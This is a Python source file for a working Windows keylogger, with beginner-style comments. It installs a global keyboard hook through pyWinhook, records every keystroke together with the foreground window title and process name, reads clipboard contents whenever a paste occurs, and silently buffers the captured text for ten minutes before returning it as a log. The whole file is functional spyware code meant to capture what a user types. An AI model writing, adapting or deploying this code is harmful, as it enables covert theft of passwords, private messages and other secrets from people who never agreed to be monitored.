from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

# create Keylogger Class or objet with 2 method
class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        #return handle to active windows
        #window that is currently active, allow to monitor activities
        hwnd = windll.user32.GetForegroundWindow()
        #define variable as unsigned long integer initialized to 0
        pid = c_ulong(0)
        #call function from user32 library
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        #retrieve value from the pid variable
        process_id = f'{pid.value}'

        #create buffer
        executable = create_string_buffer(512)
        #open the process specified by pid
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        #return base name of the executable
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        )

        #create buffer
        window_title = create_string_buffer(512)
        #call function from user32 library
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            #assign the windows title name to 'current_windows' attribute of KeyLogger
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: windows name uknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

         #close handle to the foreground windows
        windll.kernel32.CloseHandle(hwnd)
        #close handle to the process
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    run()
    print('done.')